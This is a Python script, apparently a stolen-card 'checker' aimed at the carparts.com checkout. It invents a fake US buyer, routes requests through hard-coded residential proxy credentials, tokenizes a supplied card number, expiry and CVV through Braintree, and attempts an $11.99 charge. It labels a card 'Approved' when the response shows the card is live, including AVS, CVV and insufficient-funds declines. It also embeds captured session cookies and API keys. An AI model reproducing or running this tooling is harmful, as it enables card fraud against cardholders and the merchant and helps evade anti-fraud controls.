import datetime
import random
import uuid
from faker import Faker
import names
import requests
from requests import Session
from dataclasses import dataclass

def generate_usa_address():
	fake = Faker('en_US')
	try:
		first_name = fake.first_name()
		last_name = fake.last_name()
		return {
			"firstname": first_name,
			"lastname": last_name,
			"email": f"{first_name.lower()}{last_name.lower()}{fake.random_number(digits=3)}@{fake.free_email_domain()}",
			"street": (f"{random.randint(1000, 9999)} {random.choice(['nw', 'sw', 'ne', 'se'])} {random.randint(1, 100)}th {random.choice(['st', 'ave', 'blvd', 'rd'])}"),
			"city": fake.city(),
			"state": fake.state_abbr(),
			"postcode": str(random.randint(33100, 33199)),
			"telephone": fake.numerify('305#######'),
			"date": (datetime.datetime.now(datetime.UTC).strftime('%Y-%m-%dT%H:%M:%S.') + f'{int((datetime.datetime.now(datetime.UTC).microsecond) / 1000):03d}Z')

		}
	except KeyError:
		return generate_usa_address()
        

class ConfigsPAge:
    def QueryText(self, data:str = None, chainOne:str = None, chainTwo:str = None):
        
            self.uophs = data[ data.index(chainOne) + len (chainOne):data.index(chainTwo,  data.index(chainOne) + len (chainOne))]
            try:
                return self.uophs
            
            except: 
                return 'value not found' 
    @classmethod
    def SessionId(self):
        self.id = str(uuid.uuid4())
        return self.id
    @classmethod
    def RandomName(self,dato:str=None):
        if dato == 'username': 
            self.username = "{}{}{}".format(
                    names.get_first_name(),
                    names.get_last_name(),
                    random.randint(1000000,9999999)
                    )
            return self.username
         
        elif dato == 'email': 
            self.email = "{}{}{}@gmail.com".format(
                names.get_first_name(),
                names.get_last_name(),
                random.randint(1000000,9999999)
            )
            return self.email
        
        elif dato == 'password': 
            self.password = "{}{}#{}".format(
                names.get_first_name(),
                names.get_last_name(),
                random.randint(1000000,9999999)
            )
            return self.password
        
        elif dato == 'numero':
            self.number = ''.join([str(random.randint(0, 9)) for _ in range(10)])
            return self.number
        
        else:
            return 'valores incorrectos: >>>   BehaviorsBraintree().RandomName("username")'
    
        
    
    def SaveResponseHhml(self, response:str):
        with open("ResponseHhml.html", "w", encoding="utf-8") as f:
            f.write(response)




class carts:
    def main(self,card):
        try:
            
            self.ccs = card.split('|')
            self.Nombre = ConfigsPAge().RandomName('username')
            self.UseMail = ConfigsPAge().RandomName('correo')
            firstname, lastname, email, phone, street, postcode, date = (generate_usa_address().get(k, '') for k in ['firstname', 'lastname', 'email', 'telephone', 'street', 'postcode', 'date'])


            if self.ccs[0].startswith("4"): self.brand = "VISA"
            if self.ccs[0].startswith("3"): self.brand = "AMEX"
            if self.ccs[0].startswith("6"): self.brand = "DISCOVER"
            elif self.ccs[0].startswith("5"): self.brand = "MASTER_CARD"

            self.session = Session()
            self.session.proxies.update({'http': "http://f880b05d3961fd7b:1Dpwz5cmSVkqJT3Y@res.proxy-seller.com:10000",'https': "http://112c3b382c0a58e5:3oRFh1gfvEzUxn4m@res.proxy-seller.com:10000"})
            
            
            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','cache-control': 'max-age=0','if-none-match': '"jk35biuw5l63u9"','priority': 'u=0, i','referer': 'https://www.carparts.com/brake-caliper-bolt?itemperpage=20&currentpage=2&sort=best-match','sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            rk = self.session.get('https://www.carparts.com/brake-caliper-bolt/dorman/rbhw14112', headers=headers)

            headers = {'accept': 'application/json, text/plain, */*','accept-language': 'es-419,es;q=0.9','apikey': 'anzhbnJvaXVz','content-type': 'application/json','origin': 'https://www.carparts.com','priority': 'u=1, i','referer': 'https://www.carparts.com/brake-caliper-bolt/dorman/rbhw14112','sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            json_data = {'items': [{'product': {'productId': '1776514','sku': 'RBHW14112','brand': {'name': 'Dorman',},},'modifiers': {'quantity': 1,},'buffereta': 0,},],'modifiers': {'location': {'zipcode': '61301','state': 'IL',},},'domain': 'carparts.com','buffereta': 0,}
            r1 = self.session.put('https://can-api.carparts.com/shopping-cart/v1/items/', headers=headers, json=json_data)
            cart_id = r1.json()['data']['cartId']

            headers = {'accept': 'application/json, text/plain, */*','accept-language': 'es-419,es;q=0.9','apikey': 'anzhbnJvaXVz','content-type': 'application/json;charset=UTF-8','origin': 'https://www.carparts.com','priority': 'u=1, i','referer': 'https://www.carparts.com/cart','sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            json_data = {'domain': 'carparts.com','orderId': cart_id,}
            r2 = self.session.post('https://can-api.carparts.com/auth/v1/token/request-access', headers=headers, json=json_data,)
            accessToken = r2.json()['data']['accessToken']

            headers = {'accept': 'application/json, text/plain, */*','accept-language': 'es-419,es;q=0.9','accesstoken': accessToken,'apikey': 'anzhbnJvaXVz','content-type': 'application/json;charset=UTF-8','origin': 'https://www.carparts.com','priority': 'u=1, i','referer': 'https://www.carparts.com/cart','sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            json_data = {'deliveryPostcode': '61301','deliveryState': 'IL','deliveryCity': 'La Salle','deliveryCountry': 'US','shippingMethod': 'Ground','shippingProtection': True,}
            response = self.session.post(f'https://can-api.carparts.com/checkout/v1/orders/{cart_id}/customer/93b885adfe0da089cdf634904fd59f71', headers=headers, json=json_data,)

            headers = {'accept': 'application/json, text/plain, */*','accept-language': 'es-419,es;q=0.9','accesstoken': accessToken,'apikey': 'anzhbnJvaXVz','content-type': 'application/json;charset=UTF-8','origin': 'https://www.carparts.com','priority': 'u=1, i','referer': 'https://www.carparts.com/checkout','sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            json_data = {'deliveryPostcode': postcode,'deliveryState': 'NY','deliveryCity': 'New York','deliveryCountry': 'US','shippingProtection': True,'cartId': cart_id,'dateUpdated': date,'deliveryFirstName': f'{firstname} {lastname}','deliveryLastName': firstname,'productProtection': True,'wmo': 'b','deliveryStreetAddress': street,'deliverySuburbAddress': '','deliveryTelephone': phone,'deliveryTracking': False,'deliveryEmailAddress': email,'promotionalEmail': True,'deliveryName': f'{firstname} {lastname}',}
            response = self.session.patch(f'https://can-api.carparts.com/checkout/v1/shipments/{cart_id}/customer/93b885adfe0da089cdf634904fd59f71', headers=headers, json=json_data,)
            
            self.client_id = ConfigsPAge().SessionId()

            headers = {'accept': '*/*','accept-language': 'es-419,es;q=0.9','authorization': 'Bearer production_7sf6sbqp_s3ftdgcyg5pv5qf8','braintree-version': '2018-05-10','content-type': 'application/json','origin': 'https://assets.braintreegateway.com','priority': 'u=1, i','referer': 'https://assets.braintreegateway.com/','sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'cross-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            json_data = {'clientSdkMetadata': {'source': 'client','integration': 'custom','sessionId': self.client_id,},'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }','variables': {'input': {'creditCard': {'number': self.ccs[0],'expirationMonth': self.ccs[1],'expirationYear': self.ccs[2],'cvv': self.ccs[3],},'options': {'validate': False,},},},'operationName': 'TokenizeCreditCard',}
            r3 = self.session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
            self.token_card = ConfigsPAge().QueryText(r3.text,'{"token":"','"')

            headers = {
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'es-ES,es;q=0.9',
                'accesstoken': accessToken,
                'apikey': 'anzhbnJvaXVz',
                'content-type': 'application/json;charset=UTF-8',
                'origin': 'https://www.carparts.com',
                'priority': 'u=1, i',
                'referer': 'https://www.carparts.com/checkout',
                'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
                # 'cookie': 'ConstructorioID_client_id=72c52abb-ee09-4b57-bbb3-06d5401d4326; _gcl_au=1.1.133169264.1768891617; _bs=41c45364-71b3-fca1-ebf1-a24a24e3e684; fs_uid=#o-1QKHGD-na1#3581c47d-3caa-47c7-84a3-1c0dd05e6d8b:4bfaf1f1-85cc-4fd0-a301-21891e84dcf4:1768891620401::1#/1800427621; OptanonConsent=isGpcEnabled=0&datestamp=Tue+Jan+20+2026+00%3A47%3A04+GMT-0600+(hora+est%C3%A1ndar+central)&version=202512.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&consentId=fd82aa87-1240-42cb-befb-1a559cb74a3e&interactionCount=0&isAnonUser=1&landingPath=https%3A%2F%2Fwww.carparts.com%2Fbrake-caliper-bolt%2Fdorman%2Frbhw14112&groups=C0001%3A1%2CC0004%3A1%2CC0002%3A1%2CC0003%3A1; bm_ss=ab8e18ef4e; ConstructorioID_session_id=2; bm_mi=C0B228317A30087801F845FDEFD7C8D5~YAAQCw7SF9SF5uibAQAAcohEER4trK+G9xg+uvsTRPhzseS0WOOWs9nT/GQLNg0Zc8nAeFMnRSrCLfK9TqzB/5QgXzX3OhqomydQccJ55Y0e/sjgEp80qiFJUyxzzUFLTjFxOCR9IzSYJLxs5qd7o3v/FURwkfnk5NHGohYgirN519jp/LI4rc1xY0g1lfypF+jaqlA1jnYzaWZUlJ//rNvE9GIfBIzTBaMFii3lmoNI2MpprGop9cE6/t45+NX6yqJHGBWvf33tVubexHZUIPDpSR+srVHtaZ5bcasuaMFmv94fgUZNjRw3/ZFKc/25+IgzaQ==~1; bm_sv=FEF15177CFAA27C01CFEE7C6B1B27080~YAAQCw7SFzyf5uibAQAAT8NEER5jn0g5UBURWSuOiN7HXtYAa1e0VKkTBrdFOGFyS+16VxjVIKgeRTVMFAl9LSAifJTEKxDhRTvaf58oQQUSva1AnH8k6Hu2s48XsilWoLkb1qmT9pKMEtp50R2Bhgmm3P5YB7HW2mghswyPtjFvinqRxTMCf2uhofKWTii9qnMlo8V8lX1t7olcwjbv2e0c9D2OJ/ih+0GEL2EYURM/JiofRwPb8ZudhkJFtqfId/7R~1; ak_bmsc=C0AA3DC7E207063E0D2539636202830A~000000000000000000000000000000~YAAQ2EJ1aE8U3AGcAQAAUMlEER4/m7eU63lq5XGR3fuEPHS4c09xh+4gfHBrzA2HLchFQDglgkC9N/VI10ZUR3m7x5OfPP130gELLsJgx7lQy19fXIx4WccezkIvflGVILPseBzrDphwpaM9e/0VzRouNeF/iYhXrzzjMLs1OAd2Wzifxt3A2juXBmyHq9FUZMTN7Ov7HPedfESfSo3vsB9v3J39iXeIxi2+NQ2UppJl5p5lMIGwStMW1oZ59J9cBS0eGCDQaXziMiiMcTFSKS6E0AWzIdDpaP0jH1ZSEMvelzqvFlTLfb2fts7MHySctbWa95vrfIcRkN6nSkpak4gKync/E0FJwmqxE4oekiPWsLnhkQ59PPrP+fV4GBPeKUeTOzUnHh7MdBH/J9YCEpFplL++YJxOeAP2A+2zShI+jqS60rk=; bm_so=2787D0B8A5A969925125BDF3EDD168EF038469881D25BB887FA2EF87998010E7~YAAQDw7SF8bBxQ2cAQAABtpOEQZ6kxAuI/ZCRq9CQfP4+aSRVoht2XIAtMAMGTANj+LP3Aa/ScwCb7LNdAQgB/w4B7pyj2eEsAZyApy6BG4UTsrOBT+MVxWhMeQ/rNzDd7aBK3Ia1DxcdzX8XGRICy90ZKrvw65aYdF1VusMp79Ephe5MvXvLYiEx+0GQB0/xKBle4P/APcvJVNVWTdvoOXPwaDwwuw5nzaMD+zOrUvo7tka0RGGx4T28Y3wGvqH+O8csvcfEC6Eia5U1HTr9ow3A5iIto6cggvGD4oK+qkW2ETmKDOBvifmtPac5N+Pz2T2ITpm34PVIp2zXEkUCA3Cf6q7u5yT7UXCE+/JrRlNzb0JDsNSaOBKeSkdrmZBQwantPjjBVMsDVcaiYtXLM3pJOCVjVPO9GuoPGSYo0b2F7sVBfe+eoQQYvL1iFQjvpATOchQPs652zi/D9ksow==; ConstructorioID_session={"sessionId":2,"lastTime":1769816911188}; bm_s=YAAQCw7SF3zw6uibAQAAAStPEQTJ/sNHrDQnoF03zux2Rayt1AAEU7Ow9NHSacTKHq+38XQrJ2m8zqSg4mbvMJrcATWeNa2VZ07w2dMjF1BvYXUCbH4hrhDzRnLHonWL2syeKNFZMR7YtJ50zytsuviaGz/gJE4+S0+AUexHeK7tT2qJydMKcTlKNeZW1YYoCLxdYwR4tsMMscZgEZAnVqQ7kUPaCYpiWGQ3AM10Yelz8XnIRdvva/pb1WhtSd4iXPn9sKXypPtN/tGjg2L643aeOwMaVryWD/VxRXxnMW5FykZL3jtHg3EAjPCI/sGFu/6O1b3ooTI0kKizWBWp4mhi1nQZwGYltiuwWllOcx7iT8mIr3weGwWRSr7fygelJoPOM8OfOGtdYRpo0MFlFPxDt77lRwVD2DVlLoyfUdoXmE2MRiiW9qoH/Lub7L7JuxMh5hmSbCKyBYHhJGzPwoks7iSZgB8zT6nIZ5PsjBbdagWxD5NkfhDfJKRFX6tt38ClhyKsU7fsN1xN/v3m6p/K9p73loGepeG4WDhBFYfXNlNRliglLvgffPDKeeMEBPHCjGp4LAe1onDUW7O+; forterToken=4bf05906855b4c80b19368f422c6ea81_1769816912809__UDF43-m4_23ck_dsXpiZdSJ6w%3D-1498-v2',
            }

            json_data = {
                'paymentMethod': 'CreditCard',
                'paymentMethodToken': '',
                'cvv': '',
                'cctype': '',
                'cpgid': '',
                'paymentMethodNonce': self.token_card,
            }

            r4 = self.session.post(f'https://can-api.carparts.com/checkout/v1/payments/{cart_id}/customer/93b885adfe0da089cdf634904fd59f71',headers=headers,json=json_data,)

            headers = {
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'es-ES,es;q=0.9',
                'accesstoken': accessToken,
                'apikey': 'anzhbnJvaXVz',
                'content-type': 'application/json;charset=UTF-8',
                'origin': 'https://www.carparts.com',
                'priority': 'u=1, i',
                'referer': 'https://www.carparts.com/checkout',
                'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
                }

            json_data = {}

            r5 = self.session.post(f'https://can-api.carparts.com/checkout/v1/payments/card/{cart_id}/customer/93b885adfe0da089cdf634904fd59f71',headers=headers,json=json_data,)
            Suceess = r5.text           
            msg = ConfigsPAge().QueryText(Suceess,'"message":"', '"')
            

            if r5.status_code == 302 or r5.status_code == 200:
                status = "Approved! ✅"
                msg = "$11.99"
            elif msg == "Payment declined. Gateway Rejected: avs":
                status = "Approved! ✅"
            elif msg == "Payment declined. Insufficient Funds":
                status = "Approved! ✅"
            elif (
                msg == "Payment declined. Card Issuer Declined CVV"
                or msg == "Payment declined. avs_and_cvv"
                or msg == "cvv"
            ):
                status = "Approved! ✅"
            else:
                status = "Dead! ❌"

            return status, msg

        except: 
            return 'Declined! ❌','error'